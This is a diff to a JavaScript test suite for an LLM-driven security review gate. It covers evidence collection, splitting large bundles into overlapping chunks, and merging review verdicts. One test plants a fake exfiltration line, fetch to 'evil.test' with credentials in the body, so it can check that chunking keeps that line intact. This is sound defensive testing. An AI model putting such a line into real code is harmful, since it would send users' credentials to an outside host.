@@ -5,7 +5,7 @@ import path from 'node:path'
 import crypto from 'node:crypto'
 import * as tar from 'tar'
 import test from 'node:test'
-import { CRITERIA, MARKET_RISK_POLICY, MODEL, validateReview, readEvidenceDirectory, reviewSubmission } from '../scripts/llm-review.mjs'
+import { CRITERIA, MARKET_RISK_POLICY, MODEL, validateReview, readEvidenceDirectory, reviewSubmission, createReviewBatches, mergeBatchReviews } from '../scripts/llm-review.mjs'
 import { runSecurityGate, CHECK_NAME } from '../scripts/security-pr-gate.mjs'
 import { runGate } from '../scripts/trusted-pr-gate.mjs'
 
@@ -61,7 +61,7 @@ test('evidence collection rejects secrets, links and truncation instead of sampl
     await fs.symlink('client.js', path.join(directory, 'link.js'))
     await assert.rejects(() => readEvidenceDirectory(directory), /链接/)
     await fs.rm(path.join(directory, 'link.js'))
-    await fs.writeFile(path.join(directory, 'huge.js'), 'a'.repeat(512 * 1024 + 1))
+    await fs.writeFile(path.join(directory, 'huge.js'), 'a'.repeat(16 * 1024 * 1024 + 1))
     await assert.rejects(() => readEvidenceDirectory(directory), /上限/)
   } finally { await fs.rm(directory, { recursive: true, force: true }) }
 })
@@ -223,7 +223,7 @@ test('market policy distinguishes authorized configuration and ordinary bugs fro
   assert.ok(!CRITERIA.disclosure.includes('费用'))
 })
 
-test('compacts auxiliary files and node_modules blocks while preserving inventory', async () => {
+test('retains executable tests and complete dependency bundles while preserving inventory', async () => {
   const directory = await fs.mkdtemp(path.join(os.tmpdir(), 'compact-evidence-'))
   try {
     await fs.mkdir(path.join(directory, 'test'), { recursive: true })
@@ -249,18 +249,18 @@ test('compacts auxiliary files and node_modules blocks while preserving inventor
 
     const filePaths = evidence.files.map(f => f.file)
     assert.ok(!filePaths.includes('source/pnpm-lock.yaml'))
-    assert.ok(!filePaths.includes('source/test/client.test.js'))
+    assert.ok(filePaths.includes('source/test/client.test.js'))
     assert.ok(!filePaths.includes('source/lib/index.js'))
     assert.ok(filePaths.includes('source/src/index.ts'))
     assert.ok(filePaths.includes('source/bundle.js'))
 
     const bundleFile = evidence.files.find(f => f.file === 'source/bundle.js')
-    assert.ok(bundleFile.text.includes('[折叠打包内嵌的第三方依赖 node_modules 模块]'))
-    assert.ok(!bundleFile.text.includes('const z = 1;'))
+    assert.equal(bundleFile.text, bundledCode)
+    assert.ok(bundleFile.text.includes('const z = 1;'))
   } finally { await fs.rm(directory, { recursive: true, force: true }) }
 })
 
-test('deduplicates artifact files identical to source files in prompt input while keeping full text for validation', async () => {
+test('retains identical installed artifact text for independent complete batch validation', async () => {
   const bytes = await packageBytes()
   let promptEvidence
   const sha256 = crypto.createHash('sha256').update(bytes).digest('hex')
@@ -279,6 +279,49 @@ test('deduplicates artifact files identical to source files in prompt input whil
   assert.equal(result.passed, true)
   const artifactClient = promptEvidence.find(e => e.file === 'artifact/client.js')
   assert.ok(artifactClient)
-  assert.match(artifactClient.text, /该文件内容与 source\/client\.js 逐字完全一致/)
+  assert.equal(artifactClient.text, '[L1] register business panel')
 })
 
+
+
+test('large one-line bundled code is completely covered, overlapping, bounded and independently validated', () => {
+  const text = 'a'.repeat(99950) + 'fetch("https://evil.test", {body: credentials})' + '😀'.repeat(160000)
+  const file = 'artifact/app/dist/bundle.js'
+  const batches = createReviewBatches([{file, text:'[L1] '+text}], [{file,text}])
+  const chunks = batches.flatMap(batch=>batch.validation).filter(item=>item.file.includes('#chars='))
+  let covered = 0
+  for(const chunk of chunks){
+    const [,start,end] = chunk.file.match(/#chars=(\d+)-(\d+)$/).map(Number)
+    assert.ok(start<=covered); assert.equal(chunk.text,text.slice(start,end)); covered=end
+    assert.ok(!/[\uD800-\uDBFF]$/.test(chunk.text)); assert.ok(!/^[\uDC00-\uDFFF]/.test(chunk.text))
+  }
+  assert.equal(covered,text.length)
+  assert.ok(chunks.some(item=>item.text.includes('fetch("https://evil.test", {body: credentials})')))
+  for(const batch of batches) assert.ok(JSON.stringify(batch.prompt).length<=300000)
+})
+
+test('any blocking chunk prevents aggregated approval; incomplete and transport failure cannot pass', () => {
+  const pass=validateReview(verdict(),evidence)
+  const block=verdict();block.criteria.find(item=>item.id==='security').status='fail'
+  assert.equal(mergeBatchReviews([pass,validateReview(block,evidence)]).passed,false)
+  assert.equal(mergeBatchReviews([pass,validateReview(block,evidence)]).criteria.find(item=>item.id==='security').status,'fail')
+  assert.throws(()=>mergeBatchReviews([]))
+  assert.throws(()=>mergeBatchReviews([{criteria:[]}]))
+})
+
+
+test('unbounded batch count and shared context fail before any model request', () => {
+  const files=Array.from({length:161},(_,i)=>({file:`artifact/${i}.js`,text:'a'.repeat(190000)}))
+  assert.throws(()=>createReviewBatches(files), /80 个分块/)
+  const context=Array.from({length:10},(_,i)=>({file:`submission/${i}`,text:'a'.repeat(20000)}))
+  assert.throws(()=>createReviewBatches(context), /共享审核上下文/)
+})
+
+
+test('each batch repeats global submission manifest and README context', () => {
+ const context=[{file:'submission/probe',text:'pinned artifact manifest'}, {file:'submission/pr',text:'submission purpose'}, {file:'source/package.json',text:'{"name":"panel"}'},{file:'source/README.md',text:'user authorized scope'}]
+ const data=[...context,{file:'artifact/bundle.js',text:'z'.repeat(700000)}]
+ const batches=createReviewBatches(data)
+ assert.ok(batches.length>1)
+ for(const batch of batches) for(const item of context) assert.ok(batch.prompt.some(other=>other.file===item.file&&other.text===item.text))
+})
